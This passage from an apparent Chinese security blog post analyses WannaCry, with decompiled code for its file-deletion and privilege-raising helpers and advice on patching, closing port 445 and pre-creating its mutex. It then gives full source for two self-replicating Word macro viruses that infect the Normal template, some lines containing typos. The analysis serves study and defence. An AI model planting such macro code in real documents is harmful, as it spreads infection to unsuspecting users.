<p>taskdl 的代码量相比上面的其他文件小很多了，主要就是涉及删除文件的操作</p>
<h2 id="7-1-DeleteFile-删除回收站和临时目录下的-WNCRY文件"><a href="#7-1-DeleteFile-删除回收站和临时目录下的-WNCRY文件" class="headerlink" title="7.1 DeleteFile 删除回收站和临时目录下的.WNCRY文件"></a>7.1 DeleteFile 删除回收站和临时目录下的.WNCRY文件</h2><pre class="line-numbers language-none"><code class="language-none">int __cdecl DeleteFile(int a1)  

&#123;  



GetRecyclePathOrTempPath(a1, &amp;RecyclePath);   

&#x2F;&#x2F; 获取回收站路径或者C盘下的临时文件夹路径  

swprintf(&amp;String, (size_t)aSS, &amp;RecyclePath, aWncryt);

&#x2F;&#x2F; string&#x3D;回收站路径或临时文件夹路径+*.WNCRYT   

&#x2F;&#x2F;   

hFile &#x3D; FindFirstFileW(&amp;String, &amp;FindFileData);&#x2F;&#x2F;在回收站查找所有.WNCRYT结尾的文件  

if ( hFile &#x3D;&#x3D; (HANDLE)-1 )                    &#x2F;&#x2F; 如果没找到直接返回  

&#123;  

v2 &#x3D; (char *)Memory;  

v24 &#x3D; -1;  

if ( Memory !&#x3D; v17 )  

&#123;  

do  

&#123;  

std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::~basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;(  

v2,  

0);  

v2 +&#x3D; 16;  

&#125;  

while ( v2 !&#x3D; v17 );  

v2 &#x3D; (char *)Memory;  

&#125;  

FreeMem(v2);                                &#x2F;&#x2F; 释放内存  

result &#x3D; 0;  

&#125;  

else  

&#123;  

do                                          &#x2F;&#x2F; 如果找到了  

&#123;  

swprintf(&amp;String, (size_t)aSS_0, &amp;RecyclePath, FindFileData.cFileName);&#x2F;&#x2F; 拼接目标文件的完整路径  

v19 &#x3D; v13;                                &#x2F;&#x2F; 清空strings对象的内存  

std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(&amp;v19, 0);  

TargetFullPathLen &#x3D; wcslen(&amp;String);      &#x2F;&#x2F; 获取目标文件完整路径的长度  

if ( (unsigned __int8)std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Grow(  

&amp;v19,  

TargetFullPathLen,  

1) )  

&#123;  

wmemcpy(TargetFullPath, &amp;String, TargetFullPathLen);&#x2F;&#x2F; 拷贝目标路径  

std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Eos(  

&amp;v19,                                 &#x2F;&#x2F; 将目标文件路径和长度写入到容器  

TargetFullPathLen);  

&#125;  

LOBYTE(v24) &#x3D; 1;  

sub_4013D0(&amp;v15, (int)v17, 1u, (int)&amp;v19);&#x2F;&#x2F; 这个函数会把之前的String对象放到另一个容器里  

LOBYTE(v24) &#x3D; 0;  

std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(&amp;v19, 1);  

&#125;  

while ( FindNextFileW(hFile, &amp;FindFileData) );  

FindClose(hFile);                           &#x2F;&#x2F; 文件遍历结束  

v5 &#x3D; 0;  

for ( i &#x3D; 0; ; i +&#x3D; 16 )  

&#123;  

v7 &#x3D; (char *)Memory;  

if ( !Memory || v5 &gt;&#x3D; (v17 - (_BYTE *)Memory) &gt;&gt; 4 )  

break;  

TargetFullPath_1 &#x3D; *(const WCHAR )((char *)Memory + i + 4);  

if ( !TargetFullPath_1 )  

TargetFullPath_1 &#x3D; (const WCHAR *)&#96;std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Nullstr&#39;::&#96;2&#39;::_C;  

if ( DeleteFileW(TargetFullPath_1) )      &#x2F;&#x2F; 删除目标文件  

++v14;  

++v5;  

&#125;  

v9 &#x3D; (char *)Memory;  

v10 &#x3D; v17;  

v11 &#x3D; (char *)Memory;  

if ( Memory !&#x3D; v17 )  

&#123;  

do  

&#123;  

std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(v11, 1);  

v11 +&#x3D; 16;  

&#125;  

while ( v11 !&#x3D; v10 );  

v7 &#x3D; (char *)Memory;  

&#125;  

v17 &#x3D; v9;  

v24 &#x3D; -1;  

v12 &#x3D; v7;  

if ( v7 !&#x3D; v9 )  

&#123;  

do  

&#123;                                         &#x2F;&#x2F; 循环清空每一个容器里的内容  

std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(v12, 1);  

v12 +&#x3D; 16;  

&#125;  

while ( v12 !&#x3D; v9 );  

v7 &#x3D; (char *)Memory;  

&#125;  

FreeMem(v7);                                &#x2F;&#x2F; 释放内存  

result &#x3D; v14;  

&#125;  

return result;  

&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<ul>
<li><p>首先，该函数利用了 GetRecyclePathOrTempPah 函数获得了 回收站D:/$RECYCLE 和系统盘历史文件夹的路径C:UsersDingisoAppDataLocalTemp 这两个地址</p>
</li>
<li><p>  然后函数会循环两次，判断是否系统中存在其他的盘符。</p>
</li>
<li><p>  接着函数利用FindFirstW函数查找目标文件夹中所有的以.WNCRYT结尾的文件</p>
</li>
<li><p>  函数会将他遍历的所有的.WNCRYT文件的完整路径和长度存储到一个容器中</p>
</li>
<li><p>  当文件遍历结束 会调用DeleteFileW 删除所有容器中记录的项</p>
</li>
<li><p>  最后 循环将存放文件的完整路径和长度的容器清空 ，释放资源</p>
</li>
</ul>
<h1 id="8-taskse-exe-病毒辅助文件分析"><a href="#8-taskse-exe-病毒辅助文件分析" class="headerlink" title="8 taskse.exe 病毒辅助文件分析"></a>8 taskse.exe 病毒辅助文件分析</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token keyword">int</span> argv<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> __int16 Num_5<span class="token punctuation">,</span> <span class="token keyword">int</span> Num_0<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

Advapi32Base <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span>LibFileName<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取advapi32.dll句柄  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>Advapi32Base <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

Advapi32Base <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span>LibFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 加载advapi32.dll  </span>

<span class="token operator">*</span>

kernel32Base <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>kernel32Base <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

kernel32Base <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 加载kernel32.dll  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>kernel32Base <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

hProcess <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>GetCurrentProcess_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>TokenHandle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取当前进程的伪句柄  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>OpenProcessToken_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 以修改权限的方式 打开进程的令牌  </span>

<span class="token keyword">goto</span> LABEL_55<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>LookupPrivilegeValueA_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> aSetcbprivilege<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpLuid<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 获得LUID  </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">local_unwind2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ms_exc<span class="token punctuation">.</span>registration<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

NewState <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  

lpLuid_1 <span class="token operator">=</span> lpLuid<span class="token punctuation">;</span>  

v18 <span class="token operator">=</span> v27<span class="token punctuation">;</span>  

v19 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>AdjustTokenPrivileges_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>  

TokenHandle<span class="token punctuation">,</span>  

<span class="token number">0</span><span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>NewState<span class="token punctuation">,</span>  

<span class="token number">0x10</span><span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>PreviousState<span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>ReturnLength<span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment">// 提升当前权限  </span>

<span class="token punctuation">&#123;</span>  

<span class="token operator">*</span> 

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>WTSQueryUserToken_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>SessionId<span class="token punctuation">,</span> <span class="token operator">&amp;</span>phToken<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 获取用户的访问令牌  </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">local_unwind2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ms_exc<span class="token punctuation">.</span>registration<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>DuplicateTokenEx_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token comment">// 创建一个新的访问令牌  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>该文件的主要作用是提权，主要逻辑如下：</p>
<ul>
<li><p>  获取必要API函数地址</p>
</li>
<li><p>  提上当前的权限</p>
</li>
<li><p>  获取当前用户的访问令牌并创建一个新的访问令牌</p>
</li>
<li><p>  最后再次提升权限</p>
</li>
</ul>
<h1 id="9-WannaCry-病毒分析总结"><a href="#9-WannaCry-病毒分析总结" class="headerlink" title="9 WannaCry 病毒分析总结"></a>9 WannaCry 病毒分析总结</h1><p>该病毒涉及的相关文件及作用如下：</p>
<ul>
<li><p>  msg 病毒的语言包</p>
</li>
<li><p>  c.wnry 存储了比特币账户 一个下载链接 跟勒索相关</p>
</li>
<li><p>  t.wnry 隐藏了一个dll文件 dll的导出函数是病毒的核心代码</p>
</li>
<li><p>  u.wnry 解密器</p>
</li>
<li><p>  r.wrny 勒索文档</p>
</li>
<li><p>  @WanaDecryptor@.exe 解密器</p>
</li>
<li><p>  taskse.exe 提权</p>
</li>
<li><p>  taskdl.exe 删除临时文件和回收站的.WNCRY文件</p>
</li>
<li><p>  00000000.pky 公钥</p>
</li>
<li><p>  00000000.eky 被加密的私钥</p>
</li>
<li><p>  00000000.res 八个字节的随机数和当前时间</p>
</li>
<li><p>  .bat为解密器创建快捷方式</p>
</li>
</ul>
<p>附上病毒行为的总结图表：</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image20.png" class="" width="20">

<h1 id="10-病毒预防及杀毒方案："><a href="#10-病毒预防及杀毒方案：" class="headerlink" title="10 病毒预防及杀毒方案："></a>10 病毒预防及杀毒方案：</h1><ol>
<li><p> 该病毒利用了永恒之蓝的漏洞，微软官方提供了相应的补丁文件，用户可以通过尽快安全更新的方式防止受到针对此漏洞的病毒的攻击</p>
</li>
<li><p>经过我们分析得知，该病毒的传播主要是利用了 445<br> 端口发送病毒本体，关闭端口可以防止我们被攻击。</p>
</li>
<li><p>在分析病毒 exe 文件时，病毒加密器在<br> 加密前会进行互斥体检测。检测是否已经有加密器程序存在，这是创建了互斥体<br> MsWinZonesCacheCounterMutexA<br> ，安全软件可以预先创建互斥体，这样加密器在加密前就会自动推出，不会进行加密</p>
</li>
</ol>
<h1 id="11-学习笔记："><a href="#11-学习笔记：" class="headerlink" title="11 学习笔记："></a>11 学习笔记：</h1><h3 id="微软-宏病毒"><a href="#微软-宏病毒" class="headerlink" title="微软 宏病毒"></a>微软 宏病毒</h3><p>病毒主体</p>
<pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">&#39; Micro-Virus

Sub Document_Open()

On Error Resume Next

Application. DisplayStatusBar&#x3D;False &#39;屏蔽状态栏

Options. SaveNormalPrompt&#x3D;False
&#39;修改公用模板时在后台自动保存，不给任何提示

Ourcode &#x3D;ThisDocument. VBProject. VBComponents(1). CodeModule.
Lines(1,100)

&#39;获取当前文档代码对象

Set Host &#x3D;NormalTemplate. VBProject. VBComponents(1). CodeModule

&#39;获取共用模板的代码对象

If ThisDocument &#x3D;NormalTemplate Then
&#39;判断当前文件是否等于公用模板对象

Set Host&#x3D;ActiveDocument. VBPro ject. VBComponents(1). CodeModule

&#39;如果是，则获取当前活动文档的代码对象

End If

With Host

If. Lines(1.1)&lt;&gt;&quot;Micro-Virus&quot;Then &#39;判断当前文档是否感染病毒

. Deletelines 1,. CountOfLines &#39;如果不是，就清除原来的代码

. Insertlines 1, Ourcode&#39;嵌入病毒代码

. Replaceline 2,&quot;Sub Document_Close()&quot;&#39;更换

If ThisDocument&#x3D;nomaltemplate Then &#39;判断当前的文档是否是公用模块

. ReplaceLine 2,&quot;Sub Document_Open()&quot;

ActiveDocument. SaveAs ActiveDocument. FullName

End If

End If

End With

MsgBox &quot;MicroVirus by Content Security Lab&quot;

End Sub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h3><p>2.4该代码的基本执行流程如下：<br>1）进行必要的自我保护。高明的病毒编写者其自我保护将做得非常好，可以使word的一些工具栏失效，例如将工具菜单中的宏选项屏蔽，也可以修改注册表达到很好的隐藏效果。本例中只是屏蔽状态栏，以免显示宏的运行状态，并且修改公用模板时自动保存，不给用户提示。</p>
<pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">Application.DisplayStatusBar&#x3D;False Options.SaveNormalPrompt&#x3D;False<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>2）得到当前文档的代码对象和公用模板的代码对象。</p>
<p>2）得到当前文档的代码对象和公用模板的代码对象。</p>
<pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">Ourcode&#x3D;ThisDocument.VBProject.VBComponents（1）.CodeModule.Lines（1，100）

Set Host&#x3D;NormalTemplate.VBPro ject.VBComponents（1）.CodeModule

If ThisDocument &#x3D;NormalTemplate Then

Set Host&#x3D;ActiveDocument.VBProject.VBComponents（1）.CodeModule

End If<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>3）检查模板是否已经感染病毒，如果没有，则复制宏病毒代码到模板，并且修改函数名。</p>
<pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">With Host

If.Lines（1.1）&lt;）&quot;&quot;Micro-Virus&quot;Then

.Deletelines 1，.CountOfLines

.InsertLines 1，Ourcode

.ReplaceLine 2，&quot;Sub Document_Close（）&quot;

If ThisDocument&#x3D;nomaltemplate Then

.ReplaceLine 2，&quot;Sub Document_open（）&quot;

ActiveDocument.SaveAs ActiveDocument.Ful1Name

End If

End If

End With<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>4）执行恶意代码。</p>
<pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">MsgBox&quot;MicroVirus by Content Security Lab&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>2.5此时当前word文档就含有宏病毒，只要下次打开这个word文档，就会执行以上代码，并将自身复制到Normal.dot（word文档的公共模板）和当前文档的ThisDocument中，同时改变函数名（模板中为Document<em>Close，当前文档为Document</em>Open），此时所有的word文档打开和关闭时，都将运行以上的病毒代码，可以加入适当的恶意代码，影响word的正常使用，本例中只是简单的跳出一个提示框。将当前文档关闭再重新打开，弹出一个提示框，且屏蔽了状态栏</p>
<h3 id="宏病毒分析2"><a href="#宏病毒分析2" class="headerlink" title="宏病毒分析2"></a>宏病毒分析2</h3><p>找到一个类似于给出病毒的实现并进行分析</p>
<pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">&#39;moonlight

Dim nm(4)

Sub Smallboy_Virus()

&#39;屏蔽状态栏，以免显示宏病毒执行状态；修改公用模版是自动保存且不提示；自动执行病毒模板

On Error Resume Next

Application.DisplayStatusBar &#x3D; False

&#39;屏蔽状态栏

Options.SaveNormalPrompt &#x3D; False

&#39;修改公用模板时在后台自动保存，不给任何提示

Ourcode &#x3D; ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1,
100)

&#39;获取当前文档代码对象

Set host &#x3D; NormalTemplate.VBProject.VBComponents(1).CodeModule

&#39;获取共用模板的代码对象

&#39;

&#39;获取当前文档对象代码和共用模板对象代码

If ThisDocument &#x3D; NormalTemplate Then

&#39;判断当前文件是否等于公用模板对象

Set host &#x3D; ActiveDocument.VBProject.VBComponents(1).CodeModule

&#39;如果是，则获取当前活动文档的代码对象

End If

&#39;

&#39;设立检查当前文档是否被感染，如果没有就自动执行复制宏病毒到模板并修改函数名操作

With host

If .Lines(1.1) &lt;&gt; &quot;Smallboy_Virus()&quot; Then

&#39;判断当前文档是否感染病毒

.deletelines 1, .countoflines

&#39;如果不是，就清除原来的代码

.insertlines 1, .OurcodeLines

&#39;嵌入病毒代码

.replaceline 2, &quot;Sub Smallboy_Virus()&quot;

&#39;更换 Smallboy_Virus

If ThisDocument &#x3D; NormalTemplate Then

&#39;判断当前的文档是否等于公用模块

.replaceline 2, &quot;Sub Smallboy_Virus()&quot;

&#39;如果是，则替换为 Smallboy_Virus

ActiveDocument.SaveAs ActiveDpcument.FullName

&#39;保存文档，并修改函数名（）

End If

End If

End With

&#39;*弹出第一个框*

MsgBox &quot;！！！&quot;

&#39;*定义算数数据成员*

Count &#x3D; 0 &#39;定义count&#x3D;0

try: &#39;执行try语句

On Error GoTo 0

On Error GoTo try

test &#x3D; -1 &#39;初始化并定义text&#x3D;-1

con &#x3D; 1 &#39;初始化并定义con&#x3D;1

tog$ &#x3D; &quot;&quot; &#39;初始化tog$

i &#x3D; 0 &#39;初始化并定义i&#x3D;0

&#39;开始执行算术数据成员的行循环语句

While test &#x3D; -1

&#39;因为之前已经定义了test&#x3D;-1，所以肯定会先执行一次while循环

For i &#x3D; 0 To 4

&#39;执行一个for循环

nm(i) &#x3D; Int(Rnd() * 100)

&#39;将rnd（）*100的正整数结果赋值给数组nm（i）

con &#x3D; con * nm(i)

&#39;将con*nm(i)的值传回给con

If i &#x3D; 4 Then

&#39;如果i&#x3D;4,也就是for循环结束之后，开始执行if下的语句

tog$ &#x3D; tog$ + Str$(nm(4)) + &quot;&#x3D;?&quot;

&#39;将tog$和Str$( nm(4))+字符串&quot;&#x3D;？&quot;的值都传给tog$

GoTo beg &#39;执行beg语句

End If &#39;上一个if判断语句执行结束

tog$ &#x3D; tog$ + Str$(nm(i)) + &quot;*&quot;

&#39;将tog$和Str$( nm(4))+字符串&quot;*&quot;的值都传给tog$

Next i &#39;返回for循环

beg:

&#39;显示第二个对话框，进行答题判断

Beep

ans$ &#x3D; InputBox(&quot;今天是&quot; + Date$ + &quot;，我们玩个心算游戏可好？&quot; +
Chr$(13) + &quot;如果你答错了，

我将代表月亮消灭你！&quot; + Chr$(13) + tog$, &quot;Smallboy&quot;)

&#39;显示心算题，和输入心算结果

&#39;*输入运算结果后将要执行的语句&#39;

If RTrim$(LTrim$(ans$)) &#x3D; LTrim$(Str$(con)) Then

&#39;判断ans$与con是否相等，这是是主要的if判断语句，是下面进行操作的主要依据

&#39;输入答案正确后将要执行的语句&#39;*

MsgBox &quot;恭喜你答对了！！！&quot;

&#39;设置文本格式，字体

&#39;Documents.Add

Selection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter

&#39; 设置居中对齐

Beep

With Selection.Font

&#39;设置文本字体

.Name &#x3D; &quot;黑体&quot;

&#39;设置文本字体为黑体

.Size &#x3D; 16

&#39;设置文本字体大小为16

.Bold &#x3D; 1

&#39;设置文本字体为粗体

.Underline &#x3D; 1

&#39;设置文本字体为下划线

.Color &#x3D; wdColorRose

&#39;设置文本字体问玫瑰红色

End With

Selection.InsertAfter Text &#x3D; &quot;什么是宏病毒？&quot; &#39;嵌入文本

Selection.InsertParagraphAfter &#39;换行

Beep

Selection.InsertAfter Text:&#x3D;&quot;答案：&quot; &#39;嵌入文本

Selection.Font.Italic &#x3D; 1 &#39;设置文本字体为斜体

Selection.InsertAfter Text:&#x3D;&quot;我就是&quot; &#39;嵌入文本

Selection.InsertParagraphAfter &#39;换行

Selection.InsertParagraphAfter &#39;换行

Selection.Font.Italic &#x3D; 0 &#39;撤销文本为斜体

Beep

Selection.InsertAfter Text:&#x3D;&quot;如何防御宏病毒&quot; &#39;嵌入文本

Selection.InsertParagraphAfter &#39;换行

Selection.InsertParagraphAfter &#39;换行

Beep

Selection.InsertAfter Text:&#x3D;&quot;答案：&quot; &#39;嵌入文本

Selection.Font.Italic &#x3D; 1 &#39;设置文本字体为斜体

Selection.InsertAfter Text:&#x3D;&quot;别看我&quot; &#39;嵌入文本

MsgBox &quot;按确定键，我将告诉你一个秘密......&quot;, &quot;好吧，告诉你吧！&quot;

GoTo out &#39;退出goto语句

&#39;输入答案不正确后将要执行的语句

Else &#39;执行else语句，也就是回答错误后将要执行的

Count &#x3D; Count + 1 &#39;count++，本来count初始化为0

For j &#x3D; 1 To 20 &#39;执行循环语句，循环20次

Beep

Documents.Add &#39;增加一个现在这个文档

Next j

Selection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter

&#39;设置文本格式为居中对齐

Selection.InsertAfter Text:&#x3D;&quot;宏病毒&quot; &#39;嵌入一个文本

If Count &#x3D; 2 Then GoTo out

&#39;判断是否执行打开该文本操作够2个20次，如果够了就退出goto语句

GoTo try

WordBasic.filedefault &#39;退出WordBasic文本

End If

Wend &#39;结束with语句

out: &#39;退出

